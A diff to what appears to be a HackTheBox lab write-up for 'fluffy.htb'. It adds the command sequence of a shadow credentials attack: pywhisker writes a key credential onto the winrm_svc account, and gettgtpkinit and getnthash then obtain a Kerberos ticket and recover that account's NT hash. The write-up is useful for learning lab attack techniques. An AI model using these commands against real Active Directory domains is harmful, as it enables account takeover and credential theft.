@@ -11,3 +11,23 @@ basically it allow us to modify the `msDS-KeyCredentialLink` to add shadow crede
 pywhisker.py -d "<DOMAIN" -u "<USER>" -p "<PASSWORD>" --target "winrm_svc" --action "add"
 
 ```
+
+
+then we need to get TGT with the outputed certs:
+```bash
+gettgtpkinit.py -cert-pem oBwGyENT_cert.pem -key-pem oBwGyENT_priv.pem fluffy.htb/winrm_svc winrm_svc.ccache
+
+```
+this command will get us AS-REP encryption key. This is the **user's NT hash** derived from the AS-REP response.
+
+export the ccache:
+```bash
+export KRB5CCNAME=winrm_svc.ccache
+```
+
+
+then last thing to get the NT hash:
+```bash
+python3 getnthash.py -key 159bb5340c836973dd34c732c9f1efe0e6a98771ef00bdf0918d514b55d405ee fluffy.htb/winrm_svc
+
+```
